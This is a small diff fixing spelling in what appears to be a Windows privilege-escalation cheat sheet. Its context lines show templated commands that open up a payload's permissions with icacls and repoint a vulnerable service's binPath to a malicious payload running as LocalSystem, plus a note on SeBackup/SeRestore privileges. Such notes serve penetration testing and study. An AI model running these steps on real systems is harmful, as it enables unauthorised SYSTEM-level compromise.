@@ -183,7 +183,7 @@ icacls [MALICIOUS-PAYLOAD-PATH] /grant Everyone:F
 ```
 * Change the service's associated executable and account with:
 ```
-sc config [VULNERABLE-SERVICE] binPath= "[MALICIOIUS-PAYLOAD-PATH" obj= LocalSystem
+sc config [VULNERABLE-SERVICE] binPath= "[MALICIOUS-PAYLOAD-PATH" obj= LocalSystem
 ```
 ```
 sc stop [VULNERABLE-SERVICE]
@@ -197,7 +197,7 @@ sc start [VULNERABLE-SERVICE]
 
 ## SeBackup and SeRestore
 
-* Check priviliges with this command:
+* Check privileges with this command:
 ```
 whoami /priv
 ```
